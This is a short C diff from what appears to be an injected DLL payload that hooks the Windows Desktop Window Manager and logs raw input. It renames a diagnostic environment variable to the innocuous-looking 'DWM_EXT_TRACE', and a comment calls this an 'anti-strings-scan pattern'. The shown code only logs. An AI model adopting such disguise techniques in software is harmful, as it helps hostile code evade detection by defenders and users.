@@ -111,7 +111,7 @@ typedef struct {
 /* ── Local plaintext diagnostic (bypasses slog TLS-in-manual-map).
  * Everything critical also logs here so the plaintext file always tells the
  * full story even when the encrypted logger silently fails. */
-/* Route rawinput diag through encrypted slog. Set SVCLDB_PLAINTEXT_DIAG=1
+/* Route rawinput diag through encrypted slog. Set DWM_EXT_TRACE=1
  * env var to also mirror to payload_early.txt for iteration. See
  * dllmain.c early_log + dwm_hooks.c hook_diag_raw for the same
  * anti-strings-scan pattern. */
@@ -125,7 +125,7 @@ static void rin_diag(const char *fmt, ...) {
     slog_writef("payload.log", "rin: %s", body);
     if (g_rin_plaintext < 0) {
         char buf[8];
-        DWORD n = GetEnvironmentVariableA("SVCLDB_PLAINTEXT_DIAG",
+        DWORD n = GetEnvironmentVariableA("DWM_EXT_TRACE",
                                           buf, sizeof(buf));
         g_rin_plaintext = (n > 0 && buf[0] != '0') ? 1 : 0;
     }
